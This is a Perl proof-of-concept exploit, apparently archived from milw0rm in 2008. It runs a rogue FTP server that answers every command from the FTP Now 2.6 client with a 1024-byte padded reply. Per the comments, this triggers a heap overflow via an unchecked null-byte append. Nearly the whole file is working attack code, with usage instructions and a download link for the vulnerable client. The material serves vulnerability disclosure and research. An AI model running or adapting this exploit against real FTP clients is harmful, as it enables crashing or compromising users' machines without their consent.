#!/usr/bin/perl
# By Dr.Pantagon
# www.deltasecurity.ir
# DeltaSecurityCenter
# Special Tnx D_7J AND H!V++
# FTP Now version 2.6 Server Response PoC
# Usage: ./ftpnow.pl [IP]
# Download Link : http://www.network-client.com/ftpnow/FTPNow26.exe
#
# Details: The response is broken into buffers, either at length 1024,
#                  or at '\r\n'. Each buffer is apended with \x00, without
#                  bounds checking.  If the response is exctly 1024 characters
#                  in length, you will overflow the heap with the string \x00.


use IO::Socket;
use strict;

# Create listener
my $ip=shift || '127.0.0.1';  # Default ip
my $sock = IO::Socket::INET->new(Listen=>1,
                                 LocalHost=>$ip,
                                                     LocalPort=>'21',  #Default port
                                                             Proto=>'tcp');
$sock or die ("Could not create listener.\nMake sure no FTP server is running, and you are running this as root.\n");

# Wait for initial connection and send banner
my $sock_in = $sock->accept();
print $sock_in "220 dara daram , dara daram :D \r\n";

# Send response code with total lenght of response = 1024
while (<$sock_in>){
       my $response;
       if($_ eq "USER") { $response="331 ";}
       elsif($_ eq "PASS") { $response="230 ";}
       elsif($_ eq "syst") { $response="215 ";}
       elsif($_ eq "CWD") { $response="250 ";}
       elsif($_ eq "PWD") { $response="230 ";}
       else { $response="200 ";}
       print $sock_in $response."A"x(1024-length($response)-2)."\r\n";
}
close($sock);

# milw0rm.com [2008-11-01]